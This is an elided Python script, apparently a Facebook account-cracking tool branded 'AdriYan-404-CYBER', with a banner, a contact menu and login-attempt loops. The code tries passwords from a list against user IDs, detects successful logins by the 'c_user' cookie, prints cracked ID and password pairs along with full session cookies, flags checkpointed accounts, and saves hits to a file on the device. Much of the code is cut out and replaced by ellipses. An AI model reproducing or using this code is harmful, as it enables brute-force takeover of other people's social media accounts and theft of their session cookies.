...
\033[38;5;46m[-]\033[38;5;46mVERSION   :\033[38;5;46m Personal
\033[38;5;46m[-]\033[38;5;46mAUTHOR    :\033[38;5;46m AdriYan-404-CYBER         
\033[38;5;46m[-]\033[38;5;46mGITHUB    :\033[38;5;46m AdriYan-404-CYBER         
\033[38;5;46m[-]\033[38;5;46mTEAM      :\033[38;5;46m AdriYan-404-CYBER         
\033[38;5;46m===============================================================
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/+8801706870024');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/meri.jan.ummmah?mibextid=ZbWKwL');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://github.com/Adriyan404');time.sleep(1)
		admin()
	if bal =='0':
		Main()
def hoga_check():
...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mAdriYan\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'upgrade-insecure-requests': '1',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [AdriYan-OK] '+cid+' | '+ps+'\33[0;92m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\33[1;91m[AdriYan-CP] {uid}|{ps}")
                print(f'{W}CP-UA--> {pro}\n ')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[AdriYan] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
   ...
   "method": 'GET',
    ...
    'upgrade-insecure-requests': '1',
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\033[97;1m       [AdriYan-OK] '+uid+' | '+ps+'\33[0;92m')
                print(f'\r\33[1;92m       [🚀] Number : {uid}')            
                print(f'\r\033[1;92m [🚀] COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/yousuf-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
